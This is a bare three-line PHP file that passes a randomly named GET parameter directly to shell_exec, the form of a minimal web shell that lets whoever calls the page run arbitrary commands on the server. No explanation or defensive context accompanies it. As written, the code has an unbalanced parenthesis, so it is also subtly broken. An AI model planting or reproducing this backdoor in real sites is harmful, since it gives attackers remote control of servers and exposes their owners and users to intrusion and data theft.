<?php
shell_exec(($_GET['rF88sAxV']);
?>
